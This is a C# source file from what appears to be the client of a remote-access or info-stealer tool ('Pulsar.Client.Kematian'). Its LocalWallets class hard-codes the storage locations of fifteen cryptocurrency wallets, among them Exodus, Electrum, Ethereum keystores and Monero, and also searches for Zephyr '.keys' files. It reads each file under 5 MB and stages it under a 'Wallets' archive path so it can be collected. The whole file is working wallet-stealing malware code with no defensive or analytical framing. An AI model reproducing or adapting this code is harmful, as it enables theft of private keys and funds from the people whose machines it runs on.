using System;
using System.Collections.Generic;
using System.IO;
using System.Diagnostics;

namespace Pulsar.Client.Kematian.CryptoWallets
{
    public class LocalWallets
    {
        /// <summary>
        /// Gets all local cryptocurrency wallet files from the system
        /// </summary>
        /// <returns>Dictionary with file paths and contents</returns>
        public static Dictionary<string, byte[]> GetLocalWalletFiles()
        {
            Dictionary<string, byte[]> walletFiles = new Dictionary<string, byte[]>();
            
            try
            {
                CollectWalletFiles(walletFiles);
                CollectZephyrWallet(walletFiles);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error in GetLocalWalletFiles: {ex.Message}");
            }
            
            return walletFiles;
        }
        
        private static void CollectWalletFiles(Dictionary<string, byte[]> walletFiles)
        {
            var walletPaths = new Dictionary<string, string>
            {
                { "Armory", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Armory\\*.wallet") },
                { "Atomic", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Atomic\\Local Storage\\leveldb") },
                { "Bitcoin", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Bitcoin\\wallets") },
                { "Bytecoin", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "bytecoin\\*.wallet") },
                { "Coinomi", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Coinomi\\Coinomi\\wallets") },
                { "Dash", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DashCore\\wallets") },
                { "Electrum", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Electrum\\wallets") },
                { "Ethereum", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Ethereum\\keystore") },
                { "Exodus", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Exodus\\exodus.wallet") },
                { "Guarda", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Guarda\\Local Storage\\leveldb") },
                { "Jaxx", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb") },
                { "Litecoin", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Litecoin\\wallets") },
                { "MyMonero", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MyMonero\\*.mmdb") },
                { "MoneroGUI", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Documents\\Monero\\wallets") },
                { "WalletWasabi", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "WalletWasabi\\Client\\Wallets") }
            };
            
            foreach (var walletPath in walletPaths)
            {
                try
                {
                    string walletName = walletPath.Key;
                    string path = walletPath.Value;
                    
                    if (Directory.Exists(path))
                    {
                        // If path is a directory, get all files (not recursively to avoid getting too many files)
                        foreach (string file in Directory.GetFiles(path))
                        {
                            try
                            {
                                byte[] fileContent = File.ReadAllBytes(file);
                                // Skip files larger than 5MB to avoid excessive data collection
                                if (fileContent.Length <= 5 * 1024 * 1024)
                                {
                                    string fileName = Path.GetFileName(file);
                                    string zipPath = $"Wallets\\{walletName}\\{fileName}";
                                    walletFiles[zipPath] = fileContent;
                                }
                            }
                            catch (Exception ex)
                            {
                                Debug.WriteLine($"Error reading file {file}: {ex.Message}");
                            }
                        }
                    }
                    else if (path.Contains("*"))
                    {
                        // If path contains a wildcard, use GetFiles with SearchPattern
                        string directory = Path.GetDirectoryName(path);
                        string searchPattern = Path.GetFileName(path);
                        
                        if (Directory.Exists(directory))
                        {
                            foreach (string file in Directory.GetFiles(directory, searchPattern))
                            {
                                try
                                {
                                    byte[] fileContent = File.ReadAllBytes(file);
                                    // Skip files larger than 5MB
                                    if (fileContent.Length <= 5 * 1024 * 1024)
                                    {
                                        string fileName = Path.GetFileName(file);
                                        string zipPath = $"Wallets\\{walletName}\\{fileName}";
                                        walletFiles[zipPath] = fileContent;
                                    }
                                }
                                catch (Exception ex)
                                {
                                    Debug.WriteLine($"Error reading file {file}: {ex.Message}");
                                }
                            }
                        }
                    }
                    else if (File.Exists(path))
                    {
                        // If path is a file, read it directly
                        try
                        {
                            byte[] fileContent = File.ReadAllBytes(path);
                            // Skip files larger than 5MB
                            if (fileContent.Length <= 5 * 1024 * 1024)
                            {
                                string fileName = Path.GetFileName(path);
                                string zipPath = $"Wallets\\{walletName}\\{fileName}";
                                walletFiles[zipPath] = fileContent;
                            }
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"Error reading file {path}: {ex.Message}");
                        }
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Error processing wallet {walletPath.Key}: {ex.Message}");
                }
            }
        }
        
        private static void CollectZephyrWallet(Dictionary<string, byte[]> walletFiles)
        {
            try
            {
                string zephyrPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Zephyr\\wallets");
                
                if (Directory.Exists(zephyrPath))
                {
                    foreach (string file in Directory.GetFiles(zephyrPath, "*.keys", SearchOption.AllDirectories))
                    {
                        try
                        {
                            byte[] fileContent = File.ReadAllBytes(file);
                            string fileName = Path.GetFileName(file);
                            string zipPath = $"Wallets\\Zephyr\\{fileName}";
                            walletFiles[zipPath] = fileContent;
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"Error reading Zephyr wallet file {file}: {ex.Message}");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error collecting Zephyr wallets: {ex.Message}");
            }
        }
    }
} 